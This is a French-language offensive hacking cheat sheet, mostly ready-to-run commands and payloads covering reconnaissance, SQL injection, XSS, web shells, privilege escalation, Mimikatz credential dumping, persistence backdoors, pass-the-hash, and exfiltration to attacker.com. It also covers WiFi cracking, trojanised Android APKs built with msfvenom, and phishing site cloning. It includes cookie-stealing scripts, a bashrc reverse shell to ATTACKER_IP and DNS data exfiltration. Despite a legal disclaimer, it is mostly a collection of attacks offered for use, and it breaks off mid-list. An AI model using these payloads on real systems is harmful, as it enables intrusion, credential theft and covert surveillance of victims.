# ============================================================================
#                    GUIDE COMPLET DE CYBERSECURITE
#                         EDITION PROFESSIONNELLE
# ============================================================================
#
# AVERTISSEMENT LEGAL:
# Ce document est a but EDUCATIF uniquement.
# L'utilisation de ces techniques sur des systemes sans autorisation
# est ILLEGALE et passible de poursuites penales.
# Utilisez uniquement sur VOS systemes ou avec autorisation ecrite.
#
# ============================================================================

# ############################################################################
#                         TABLE DES MATIERES
# ############################################################################
#
# PARTIE 1 : RECONNAISSANCE ET OSINT
# PARTIE 2 : SCAN ET ENUMERATION
# PARTIE 3 : EXPLOITATION WEB
# PARTIE 4 : EXPLOITATION SYSTEME
# PARTIE 5 : POST-EXPLOITATION
# PARTIE 6 : PERSISTANCE
# PARTIE 7 : MOUVEMENT LATERAL
# PARTIE 8 : EXFILTRATION
# PARTIE 9 : ATTAQUES RESEAU
# PARTIE 10 : ATTAQUES WIFI
# PARTIE 11 : ATTAQUES MOBILE (Android/iOS)
# PARTIE 12 : INGENIERIE SOCIALE
# PARTIE 13 : MALWARE ET PAYLOADS
# PARTIE 14 : CRYPTOGRAPHIE
# PARTIE 15 : FORENSICS ET ANTI-FORENSICS
# PARTIE 16 : OUTILS ESSENTIELS
# PARTIE 17 : DEFENSE ET BLUE TEAM
#
# ############################################################################


# ############################################################################
#                    PARTIE 1 : RECONNAISSANCE ET OSINT
# ############################################################################

## 1.1 RECONNAISSANCE PASSIVE

### Google Dorks (Recherches avancees)
```
# Trouver des fichiers sensibles
site:example.com filetype:pdf
site:example.com filetype:sql
site:example.com filetype:log
site:example.com filetype:conf
site:example.com filetype:env

# Trouver des pages de login
site:example.com inurl:login
site:example.com inurl:admin
site:example.com inurl:wp-admin
site:example.com intitle:"index of"

# Trouver des informations exposees
site:example.com "password" filetype:txt
site:example.com "api_key" OR "apikey"
site:example.com "BEGIN RSA PRIVATE KEY"
site:pastebin.com "example.com"

# Cameras et IoT exposes
inurl:/view.shtml
intitle:"Live View / - AXIS"
inurl:"ViewerFrame?Mode="
```

### Recherche DNS
```powershell
# Windows
nslookup example.com
nslookup -type=MX example.com      # Serveurs mail
nslookup -type=NS example.com      # Serveurs DNS
nslookup -type=TXT example.com     # Enregistrements TXT
nslookup -type=ANY example.com     # Tous les enregistrements

# Linux
dig example.com
dig example.com MX
dig example.com NS
dig example.com AXFR @ns1.example.com   # Transfert de zone
host -l example.com ns1.example.com     # Zone transfer
```

### WHOIS
```bash
whois example.com
whois 8.8.8.8
# Informations: proprietaire, emails, dates, serveurs DNS
```

### Recherche de sous-domaines
```bash
# Sublist3r
python sublist3r.py -d example.com

# Amass
amass enum -d example.com

# Subfinder
subfinder -d example.com

# Knockpy
knockpy example.com

# DNSRecon
dnsrecon -d example.com -t std

# Fierce
fierce --domain example.com

# En ligne
# - crt.sh (certificats SSL)
# - dnsdumpster.com
# - virustotal.com
```

### Recherche d'emails
```bash
# theHarvester - Outil principal
theHarvester -d example.com -b all
theHarvester -d example.com -b google,linkedin,twitter

# Hunter.io (en ligne)
# EmailHippo (verification)
# Phonebook.cz
```

### Recherche sur les reseaux sociaux (OSINT)
```bash
# Sherlock - Trouver un username sur tous les reseaux
python sherlock.py username

# Social-Analyzer
python social-analyzer.py --username "target"

# Maltego (GUI) - Analyse de relations

# Recon-ng
recon-ng
> marketplace search
> marketplace install all
> modules load recon/domains-hosts/hackertarget
```

## 1.2 RECONNAISSANCE ACTIVE

### Traceroute
```powershell
# Windows
tracert example.com
pathping example.com

# Linux
traceroute example.com
mtr example.com
```

### Banner Grabbing
```bash
# Netcat
nc -v example.com 80
nc -v example.com 22
nc -v example.com 21

# Telnet
telnet example.com 80
GET / HTTP/1.1
Host: example.com

# Curl
curl -I example.com
curl -v example.com
```


# ############################################################################
#                    PARTIE 2 : SCAN ET ENUMERATION
# ############################################################################

## 2.1 NMAP - LE SCANNER DE REFERENCE

### Scans de base
```bash
# Scan simple
nmap 192.168.1.1
nmap 192.168.1.0/24

# Scan de ports specifiques
nmap -p 80 192.168.1.1
nmap -p 80,443,8080 192.168.1.1
nmap -p 1-1000 192.168.1.1
nmap -p- 192.168.1.1              # Tous les ports (65535)

# Types de scan
nmap -sT 192.168.1.1              # TCP Connect (bruyant)
nmap -sS 192.168.1.1              # SYN Scan (furtif, root)
nmap -sU 192.168.1.1              # UDP Scan
nmap -sA 192.168.1.1              # ACK Scan (firewall)
nmap -sN 192.168.1.1              # NULL Scan
nmap -sF 192.168.1.1              # FIN Scan
nmap -sX 192.168.1.1              # Xmas Scan
```

### Detection avancee
```bash
# Detection de version
nmap -sV 192.168.1.1
nmap -sV --version-intensity 5 192.168.1.1

# Detection d'OS
nmap -O 192.168.1.1
nmap -O --osscan-guess 192.168.1.1

# Scan agressif (version + OS + scripts + traceroute)
nmap -A 192.168.1.1

# Scripts NSE
nmap --script=default 192.168.1.1
nmap --script=vuln 192.168.1.1
nmap --script=safe 192.168.1.1
nmap --script=exploit 192.168.1.1
nmap --script=http-enum 192.168.1.1
nmap --script=smb-vuln* 192.168.1.1
```

### Evasion et furtivite
```bash
# Timing (plus lent = moins detectable)
nmap -T0 192.168.1.1              # Paranoid
nmap -T1 192.168.1.1              # Sneaky
nmap -T2 192.168.1.1              # Polite
nmap -T3 192.168.1.1              # Normal (defaut)
nmap -T4 192.168.1.1              # Aggressive
nmap -T5 192.168.1.1              # Insane

# Fragmentation
nmap -f 192.168.1.1               # Fragmenter les paquets
nmap --mtu 24 192.168.1.1         # MTU specifique

# Decoys (leurres)
nmap -D RND:10 192.168.1.1        # 10 IPs aleatoires
nmap -D 192.168.1.2,192.168.1.3 192.168.1.1

# Spoofing
nmap -S 192.168.1.100 192.168.1.1  # Spoof IP source
nmap --spoof-mac Dell 192.168.1.1  # Spoof MAC

# Source port
nmap --source-port 53 192.168.1.1  # Depuis port DNS
```

### Output
```bash
nmap -oN output.txt 192.168.1.1   # Normal
nmap -oX output.xml 192.168.1.1   # XML
nmap -oG output.gnmap 192.168.1.1 # Grepable
nmap -oA output 192.168.1.1       # Tous les formats
```

## 2.2 ENUMERATION DE SERVICES

### HTTP/HTTPS (80/443)
```bash
# Nikto - Scanner de vulnerabilites web
nikto -h http://192.168.1.1

# Dirb/Dirbuster - Bruteforce de repertoires
dirb http://192.168.1.1 /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://192.168.1.1 -w /usr/share/seclists/Discovery/Web-Content/common.txt

# WhatWeb - Identification de technologies
whatweb http://192.168.1.1

# Wappalyzer (extension navigateur)

# Curl
curl -I http://192.168.1.1
curl -X OPTIONS http://192.168.1.1 -v
```

### SMB (445)
```bash
# Enumeration SMB
smbclient -L //192.168.1.1 -N
smbmap -H 192.168.1.1
enum4linux -a 192.168.1.1
crackmapexec smb 192.168.1.1

# Connexion
smbclient //192.168.1.1/share -U username

# Nmap scripts
nmap --script=smb-enum-shares 192.168.1.1
nmap --script=smb-vuln* 192.168.1.1
```

### FTP (21)
```bash
# Connexion anonyme
ftp 192.168.1.1
# Login: anonymous
# Password: anonymous@

# Nmap
nmap --script=ftp-anon 192.168.1.1
nmap --script=ftp-bounce 192.168.1.1
```

### SSH (22)
```bash
# Enumeration
nmap --script=ssh-auth-methods 192.168.1.1
nmap --script=ssh2-enum-algos 192.168.1.1

# Bruteforce
hydra -l root -P passwords.txt ssh://192.168.1.1
medusa -h 192.168.1.1 -u root -P passwords.txt -M ssh
```

### DNS (53)
```bash
# Transfert de zone
dig axfr @192.168.1.1 example.com
host -l example.com 192.168.1.1
nmap --script=dns-zone-transfer 192.168.1.1
```

### SMTP (25)
```bash
# Enumeration d'utilisateurs
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.1
nmap --script=smtp-enum-users 192.168.1.1

# Telnet
telnet 192.168.1.1 25
HELO test
VRFY root
EXPN admin
```

### SNMP (161)
```bash
# Bruteforce community strings
onesixtyone -c community.txt 192.168.1.1
snmpwalk -v1 -c public 192.168.1.1
snmp-check 192.168.1.1
```

### LDAP (389)
```bash
ldapsearch -x -h 192.168.1.1 -b "dc=example,dc=com"
nmap --script=ldap-search 192.168.1.1
```

### MySQL (3306)
```bash
mysql -h 192.168.1.1 -u root
nmap --script=mysql-info 192.168.1.1
nmap --script=mysql-enum 192.168.1.1
```

### RDP (3389)
```bash
nmap --script=rdp-enum-encryption 192.168.1.1
rdesktop 192.168.1.1
xfreerdp /u:user /p:password /v:192.168.1.1
```


# ############################################################################
#                    PARTIE 3 : EXPLOITATION WEB
# ############################################################################

## 3.1 SQL INJECTION

### Detection
```
# Caracteres de test
'
"
`
')
")
`)
'))
"))
`))
```

### Types d'injection

#### Error-based
```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*
admin' --
admin' #
') OR ('1'='1
') OR ('1'='1' --
```

#### Union-based
```sql
-- Trouver le nombre de colonnes
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --

-- Extraire des donnees
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,3 FROM users --
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
```

#### Blind (Boolean)
```sql
' AND 1=1 --    (vrai)
' AND 1=2 --    (faux)
' AND (SELECT COUNT(*) FROM users)>0 --
' AND SUBSTRING(username,1,1)='a' --
```

#### Blind (Time-based)
```sql
' AND SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --
'; WAITFOR DELAY '0:0:5' --
' AND BENCHMARK(10000000,SHA1('test')) --
```

### SQLMap (outil automatise)
```bash
# Detection basique
sqlmap -u "http://site.com/page.php?id=1"

# Avec cookie
sqlmap -u "http://site.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# POST data
sqlmap -u "http://site.com/login.php" --data="user=admin&pass=test"

# Enumeration
sqlmap -u "http://site.com/page.php?id=1" --dbs                    # Bases de donnees
sqlmap -u "http://site.com/page.php?id=1" -D database --tables     # Tables
sqlmap -u "http://site.com/page.php?id=1" -D database -T users --columns
sqlmap -u "http://site.com/page.php?id=1" -D database -T users --dump

# Options avancees
sqlmap -u "URL" --level=5 --risk=3     # Plus agressif
sqlmap -u "URL" --os-shell             # Shell systeme
sqlmap -u "URL" --sql-shell            # Shell SQL
sqlmap -u "URL" --file-read="/etc/passwd"
```

## 3.2 XSS (Cross-Site Scripting)

### Reflected XSS
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<marquee onstart="alert('XSS')">
<video src=x onerror="alert('XSS')">
<audio src=x onerror="alert('XSS')">
```

### Stored XSS
```html
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>
<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

### DOM-based XSS
```javascript
// URL: http://site.com/page#<script>alert('XSS')</script>
// Le script lit location.hash et l'injecte dans le DOM
```

### Bypass de filtres
```html
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert`XSS`>
<svg/onload=alert('XSS')>
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

## 3.3 COMMAND INJECTION

### Caracteres d'injection
```bash
;       # Separateur de commandes
|       # Pipe
||      # OR logique
&       # Background
&&      # AND logique
`cmd`   # Substitution de commande
$(cmd)  # Substitution de commande
```

### Payloads
```bash
; ls
| cat /etc/passwd
&& whoami
; sleep 10
| ping -c 10 127.0.0.1
; curl http://attacker.com/shell.sh | bash
$(cat /etc/passwd)
`id`
```

### Bypass
```bash
# Bypass espaces
cat</etc/passwd
{cat,/etc/passwd}
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd';$X

# Bypass mots interdits
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
```

## 3.4 LFI/RFI (File Inclusion)

### LFI (Local File Inclusion)
```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%2F..%2F..%2Fetc/passwd
?page=/etc/passwd%00
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://input (POST: <?php system($_GET['cmd']); ?>)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
?page=/var/log/apache2/access.log
?page=/proc/self/environ
```

### RFI (Remote File Inclusion)
```
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.txt%00
?page=\\attacker.com\share\shell.php
```

## 3.5 UPLOAD DE FICHIERS

### Bypass d'extension
```
shell.php.jpg
shell.php.png
shell.pHp
shell.php5
shell.phtml
shell.php%00.jpg
shell.php;.jpg
shell.php%0d%0a.jpg
```

### Contenu malveillant
```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?=`$_GET[cmd]`?>
```

### Magic bytes
```php
GIF89a
<?php system($_GET['cmd']); ?>
```

## 3.6 XXEE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- Blind XXE -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
```

## 3.7 SSRF (Server-Side Request Forgery)

```
# Acces a des services internes
http://localhost/admin
http://127.0.0.1:22
http://192.168.1.1/
http://169.254.169.254/latest/meta-data/  (AWS metadata)

# Bypass
http://127.1/
http://0177.0.0.1/
http://0x7f.0.0.1/
http://2130706433/
http://localhost.attacker.com/
```


# ############################################################################
#                    PARTIE 4 : EXPLOITATION SYSTEME
# ############################################################################

## 4.1 EXPLOITATION WINDOWS

### Metasploit Framework
```bash
# Demarrer
msfconsole

# Rechercher un exploit
search ms17-010
search type:exploit platform:windows

# Utiliser un exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.1
set LHOST 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Meterpreter
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > hashdump
meterpreter > shell
meterpreter > download C:\\Users\\Admin\\secret.txt
meterpreter > upload backdoor.exe C:\\Windows\\Temp\\
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > run post/windows/gather/credentials/credential_collector
```

### Exploits Windows courants
```
MS08-067 - netapi (XP/2003)
MS17-010 - EternalBlue (Win7/2008)
CVE-2019-0708 - BlueKeep (RDP)
PrintNightmare - Spooler
ZeroLogon - Netlogon
```

### Privilege Escalation Windows
```powershell
# Enumeration
systeminfo
whoami /priv
whoami /groups
net user
net localgroup administrators
netstat -ano
tasklist /v

# Outils automatises
winPEAS.exe
PowerUp.ps1
Sherlock.ps1
JAWS.ps1

# Techniques
# - Services mal configures
# - DLL Hijacking
# - Unquoted Service Paths
# - AlwaysInstallElevated
# - Token Impersonation (Potato attacks)
```

## 4.2 EXPLOITATION LINUX

### Privilege Escalation Linux
```bash
# Enumeration basique
uname -a
id
sudo -l
cat /etc/passwd
cat /etc/shadow
cat /etc/crontab
ls -la /etc/cron*
find / -perm -4000 2>/dev/null    # SUID
find / -perm -2000 2>/dev/null    # SGID
find / -writable 2>/dev/null      # Writable

# Capabilities
getcap -r / 2>/dev/null

# Outils automatises
./linpeas.sh
./linux-exploit-suggester.sh
./LinEnum.sh

# Techniques courantes
# - Sudo mal configure
# - SUID binaries
# - Cron jobs
# - Path injection
# - Kernel exploits
# - Docker escape
```

### Exploits Kernel Linux
```bash
# Dirty COW (CVE-2016-5195)
# DirtyCred
# Dirty Pipe (CVE-2022-0847)
# PwnKit (CVE-2021-4034)

# Verification
uname -r
cat /etc/*release
./linux-exploit-suggester.sh
```


# ############################################################################
#                    PARTIE 5 : POST-EXPLOITATION
# ############################################################################

## 5.1 COLLECTE D'INFORMATIONS

### Windows
```powershell
# Systeme
systeminfo
hostname
whoami /all
net user
net user administrator
net localgroup
net localgroup administrators

# Reseau
ipconfig /all
arp -a
netstat -ano
route print
netsh firewall show state
netsh advfirewall show allprofiles

# Processus et services
tasklist /v
tasklist /svc
wmic service list brief
sc query

# Fichiers sensibles
dir /s *pass* *cred* *vnc* *.config
findstr /si password *.xml *.ini *.txt *.config
type C:\Windows\system32\config\SAM
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Linux
```bash
# Systeme
cat /etc/passwd
cat /etc/shadow
cat /etc/group
cat /etc/sudoers
history
cat ~/.bash_history

# Reseau
ifconfig -a
ip addr
netstat -tulpn
ss -tulpn
cat /etc/hosts
cat /etc/resolv.conf
iptables -L

# Processus
ps aux
top
cat /etc/crontab
ls -la /etc/cron.*

# Fichiers sensibles
find / -name "*.conf" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
grep -r "password" /etc/ 2>/dev/null
```

## 5.2 EXTRACTION DE CREDENTIALS

### Windows - Mimikatz
```powershell
# Executer Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords    # Mots de passe en memoire
sekurlsa::wdigest           # WDigest
sekurlsa::tickets           # Tickets Kerberos
lsadump::sam                # Base SAM
lsadump::secrets            # LSA Secrets
lsadump::dcsync /user:Administrator  # DCSync

# One-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Windows - Autres methodes
```powershell
# Hashdump avec reg
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# Puis: secretsdump.py -sam sam.hive -system system.hive LOCAL

# LaZagne - Extraction de tous les passwords
lazagne.exe all

# Credentials Manager
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"
```

### Linux
```bash
# Shadow
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt

# SSH Keys
cat ~/.ssh/id_rsa
find / -name "id_rsa" 2>/dev/null

# Historique
cat ~/.bash_history
cat ~/.mysql_history

# Fichiers de config
cat /var/www/html/wp-config.php
cat /etc/mysql/my.cnf
```


# ############################################################################
#                    PARTIE 6 : PERSISTANCE
# ############################################################################

## 6.1 PERSISTANCE WINDOWS

### Registre
```powershell
# Run Keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# RunOnce
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
```

### Taches planifiees
```powershell
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc daily /st 09:00
```

### Services
```powershell
sc create Backdoor binpath= "C:\backdoor.exe" start= auto
sc start Backdoor
```

### WMI
```powershell
# Event subscription permanente
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "BackdoorFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9"
}
```

## 6.2 PERSISTANCE LINUX

### Cron
```bash
# Crontab utilisateur
crontab -e
* * * * * /tmp/backdoor.sh

# Crontab systeme
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab
```

### SSH Authorized Keys
```bash
echo "ssh-rsa AAAAB3... attacker@host" >> ~/.ssh/authorized_keys
```

### Bashrc
```bash
echo "/tmp/backdoor.sh" >> ~/.bashrc
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> ~/.bashrc
```

### Service Systemd
```bash
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor
systemctl start backdoor
```


# ############################################################################
#                    PARTIE 7 : MOUVEMENT LATERAL
# ############################################################################

## 7.1 TECHNIQUES WINDOWS

### Pass-the-Hash (PtH)
```bash
# Impacket
pth-winexe -U DOMAIN/Administrator%aad3b435b51404eeaad3b435b51404ee:HASH //192.168.1.1 cmd.exe
psexec.py DOMAIN/Administrator@192.168.1.1 -hashes :HASH

# Mimikatz
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H HASH
```

### Pass-the-Ticket (PtT)
```powershell
# Mimikatz
kerberos::ptt ticket.kirbi
dir \\server\share
```

### PsExec
```bash
psexec.py DOMAIN/user:password@192.168.1.1
psexec.py DOMAIN/user@192.168.1.1 -hashes :HASH

# Windows
PsExec.exe \\192.168.1.1 -u Administrator -p password cmd.exe
```

### WMI
```bash
wmiexec.py DOMAIN/user:password@192.168.1.1
```

### WinRM
```powershell
# PowerShell
$cred = Get-Credential
Enter-PSSession -ComputerName 192.168.1.1 -Credential $cred
Invoke-Command -ComputerName 192.168.1.1 -Credential $cred -ScriptBlock {whoami}

# Evil-WinRM
evil-winrm -i 192.168.1.1 -u Administrator -p password
evil-winrm -i 192.168.1.1 -u Administrator -H HASH
```

### RDP
```bash
xfreerdp /u:Administrator /p:password /v:192.168.1.1
rdesktop -u Administrator -p password 192.168.1.1

# PtH RDP
xfreerdp /u:Administrator /pth:HASH /v:192.168.1.1
```

## 7.2 TECHNIQUES LINUX

### SSH
```bash
ssh user@192.168.1.1
ssh -i id_rsa user@192.168.1.1
scp file.txt user@192.168.1.1:/tmp/
```

### SSH Tunneling
```bash
# Local port forwarding
ssh -L 8080:internal:80 user@jumphost

# Remote port forwarding
ssh -R 8080:localhost:80 user@remote

# Dynamic (SOCKS)
ssh -D 9050 user@jumphost
proxychains nmap 192.168.1.1
```


# ############################################################################
#                    PARTIE 8 : EXFILTRATION
# ############################################################################

## 8.1 TRANSFERT DE FICHIERS

### HTTP
```bash
# Serveur Python
python -m http.server 8000
python3 -m http.server 8000

# Telecharger
curl http://attacker.com/file.exe -o file.exe
wget http://attacker.com/file.exe
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
certutil -urlcache -split -f http://attacker.com/file.exe file.exe
```

### SMB
```bash
# Serveur
impacket-smbserver share /tmp/share

# Client Windows
copy \\attacker.com\share\file.exe C:\file.exe
copy C:\secret.txt \\attacker.com\share\
```

### FTP
```bash
# Serveur
python -m pyftpdlib -p 21

# Client
ftp attacker.com
put secret.txt
```

### Netcat
```bash
# Recepteur
nc -lvnp 4444 > file.txt

# Emetteur
nc attacker.com 4444 < file.txt
cat file.txt | nc attacker.com 4444
```

### DNS Exfiltration
```bash
# Encoder en base64 et envoyer via DNS
cat secret.txt | base64 | while read line; do nslookup $line.attacker.com; done
```

## 8.2 COMPRESSION ET CHIFFREMENT

```bash
# Compression
tar czf archive.tar.gz /folder
zip -r archive.zip /folder
7z a archive.7z /folder

# Chiffrement
openssl aes-256-cbc -in file.txt -out file.enc -k password
gpg -c file.txt
```


# ############################################################################
#                    PARTIE 9 : ATTAQUES RESEAU
# ############################################################################

## 9.1 ARP SPOOFING / MITM

```bash
# Activer IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP Spoofing avec arpspoof
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP

# Ettercap
ettercap -T -M arp:remote /VICTIM// /GATEWAY//
ettercap -G  # Mode graphique

# Bettercap (moderne)
bettercap -iface eth0
> net.probe on
> net.sniff on
> set arp.spoof.targets VICTIM_IP
> arp.spoof on
```

## 9.2 SNIFFING

```bash
# Tcpdump
tcpdump -i eth0
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 port 80
tcpdump -i eth0 host 192.168.1.1

# Wireshark (GUI)
wireshark

# Tshark (CLI)
tshark -i eth0 -w capture.pcap
```

## 9.3 DNS SPOOFING

```bash
# Bettercap
bettercap -iface eth0
> set dns.spoof.domains example.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on

# dnsspoof
dnsspoof -i eth0 -f hosts.txt
```

## 9.4 DHCP ATTACKS

```bash
# DHCP Starvation
dhcpig -i eth0

# Rogue DHCP
# Distribuer de fausses configs reseau
```


# ############################################################################
#                    PARTIE 10 : ATTAQUES WIFI
# ############################################################################

## 10.1 CONFIGURATION

```bash
# Mode monitor
airmon-ng start wlan0
iwconfig wlan0 mode monitor

# Arreter les processus interferents
airmon-ng check kill
```

## 10.2 CAPTURE ET ANALYSE

```bash
# Scanner les reseaux
airodump-ng wlan0mon

# Cibler un reseau
airodump-ng -c CHANNEL --bssid MAC -w capture wlan0mon

# Capturer handshake
airodump-ng -c CHANNEL --bssid MAC -w handshake wlan0mon
# En parallele: deauth
aireplay-ng -0 10 -a BSSID wlan0mon
```

## 10.3 CRACKING

```bash
# WEP
aircrack-ng capture.cap

# WPA/WPA2
aircrack-ng -w wordlist.txt handshake.cap
hashcat -m 22000 hash.hc22000 wordlist.txt

# PMKID Attack (sans client)
hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng
hcxpcaptool -z pmkid.txt capture.pcapng
hashcat -m 16800 pmkid.txt wordlist.txt
```

## 10.4 EVIL TWIN

```bash
# Creer un faux point d'acces
hostapd-wpe hostapd.conf

# hostapd.conf
interface=wlan0
driver=nl80211
ssid=FreeWifi
channel=6
```

## 10.5 OUTILS

```
- Aircrack-ng suite
- Wifite (automatise)
- Fluxion (Evil Twin)
- Bettercap
- Kismet
```


# ############################################################################
#                    PARTIE 11 : ATTAQUES MOBILE (Android/iOS)
# ############################################################################

## 11.1 ANDROID - ADB

### Connexion
```powershell
# USB
adb devices

# WiFi
adb tcpip 5555
adb connect IP:5555

# Path ADB (si pas dans PATH)
$ADB = "C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
```

### Extraction de donnees
```powershell
# SMS
adb shell "content query --uri content://sms/inbox"
adb shell "content query --uri content://sms/sent"

# Contacts
adb shell "content query --uri content://contacts/phones"

# Historique d'appels
adb shell "content query --uri content://call_log/calls"

# Localisation
adb shell "dumpsys location"

# Notifications
adb shell "dumpsys notification"

# Applications
adb shell "pm list packages"
adb shell "pm list packages -3"  # Apps tierces

# Fichiers
adb pull /sdcard/DCIM ./photos
adb pull /sdcard/Download ./downloads
adb pull /sdcard/WhatsApp ./whatsapp
```

### Controle
```powershell
# Screenshot
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png

# Enregistrement ecran
adb shell screenrecord /sdcard/video.mp4
adb pull /sdcard/video.mp4

# Affichage en direct
scrcpy

# Installer APK
adb install app.apk
adb install -r app.apk  # Reinstall

# Shell
adb shell
```

### Permissions et securite
```powershell
# Accorder une permission
adb shell pm grant com.app android.permission.READ_SMS
adb shell pm grant com.app android.permission.ACCESS_FINE_LOCATION

# Revoquer
adb shell pm revoke com.app android.permission.CAMERA

# Backup complet (necessite confirmation sur telephone)
adb backup -apk -shared -all -f backup.ab

# Restaurer
adb restore backup.ab
```

## 11.2 ANDROID - PAYLOADS

### Metasploit Android Payload
```bash
# Generer APK malveillant
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o malware.apk

# Handler
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

# Commandes Meterpreter Android
meterpreter > sysinfo
meterpreter > dump_sms
meterpreter > dump_contacts
meterpreter > dump_calllog
meterpreter > geolocate
meterpreter > webcam_snap
meterpreter > record_mic
meterpreter > app_list
```

### Injection dans APK legitime
```bash
# Ajouter payload a une app existante
msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o infected.apk

# Puis signer l'APK
keytool -genkey -v -keystore my-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -keystore my-key.keystore infected.apk alias_name
```

## 11.3 ANALYSE D'APPLICATIONS

```bash
# Decompiler APK
apktool d application.apk

# Extraire code Java
jadx-gui application.apk
dex2jar application.apk
jd-gui classes-dex2jar.jar

# Analyse statique
# - Rechercher des credentials hardcodes
# - API keys
# - URLs
grep -r "password" ./
grep -r "api_key" ./
grep -r "http://" ./
```


# ############################################################################
#                    PARTIE 12 : INGENIERIE SOCIALE
# ############################################################################

## 12.1 PHISHING

### Types
```
- Email phishing (mass)
- Spear phishing (cible)
- Whaling (VIP)
- Vishing (telephone)
- Smishing (SMS)
```

### Outils
```bash
# Gophish - Plateforme de phishing
./gophish

# SET (Social Engineering Toolkit)
setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# King Phisher
# Evilginx2 (bypass 2FA)
```

### Clonage de site
```bash
# wget
wget --mirror --convert-links --page-requisites https://facebook.com

# HTTrack
httrack https://facebook.com

# SET
setoolkit > 1 > 2 > 3 > 2
```

## 12.2 PRETEXTING

### Scenarios courants
```
- Support technique
- Ressources humaines
- Livraison
- Banque
- Administration
```

### Techniques
```
- Urgence
- Autorite
- Reciprocite
